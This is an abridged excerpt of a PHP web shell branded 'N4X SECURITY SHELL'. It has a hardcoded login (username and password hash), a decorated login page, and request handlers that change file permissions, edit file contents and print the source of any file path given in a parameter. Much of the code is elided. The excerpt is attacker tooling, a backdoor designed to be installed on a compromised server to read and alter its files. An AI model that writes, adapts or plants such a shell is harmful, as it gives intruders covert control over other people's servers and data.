...
@error_log(false);
@session_start();
define("username", "blek");
define("passwd", "3181f03df62ef1aba02faf996c7ca163");
...
<head>
    ...
    <title>N4X SECURITY SHELL</title>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Caveat+Brush&display=swap" rel="stylesheet">
    <link rel="shortcut icon"
        href="https://th.bing.com/th/id/OIP.Kvts1u8LiGoKuQ8nO89eSQHaHa?pid=ImgDet&w=720&h=720&rs=1" type="image/x-icon">
</head>
<style>
    :root {
        --text-color: #fff;
    ...
    * {
    ...
    body {
        overflow: hidden;
        background-image: url(https://wallpapercave.com/wp/wp8227264.jpg);
    ...
    @media only screen and (max-width: 480px) {
        body {
            background-image: url(https://images.hdqwalls.com/download/cityscape-synthwave-5k-98-800x1280.jpg);
        }
...
<body>
    <div class="login-form">
        <h1 class="logo">N4<span>X SECUR</span>ITY</h1>
        <div class="login-box">
            <p class="quote">Sabar itu separuh daripada iman.</p>
            <form method="post">
                <?php
    ...
    if (isset($_POST["log"]) && $_POST["log"] === "login") {
        ...
        <div class="copyright"><span>&copy N4X SECURITY 2011</span></div>
    </div>
</body>
...
<body>
    <div class="main">
        <div class="logo">
            <h1>N4<span>X SECUR</span>ITY</h1>
        </div>
        <div class="header">
            <ul>
                <li>Uname: <span>
    ...
    if (isset($_POST["option"]) && $_POST["option"] === "chmod" && isset($_POST["path"])) {
        ...
        <form method="post" id="edit">
            ...
            <textarea name="content" id=""
                class="fileedit"><?php echo sanitize(file_get_contents($_POST["path"])) ?></textarea>
            <button type="submit">Submit</button>
        </form>
        <?php
    }
    if (isset($_GET["filesource"]) && file_exists($_GET["filesource"])) {
        ...
        echo "<textarea class=\"filesource\" readonly>" . sanitize(file_get_contents($_GET["filesource"])) . "</textarea>";
    ...
    <div class="copyright">
        <span>&copy N4X SECURITY 2011</span>
    </div>
</body>
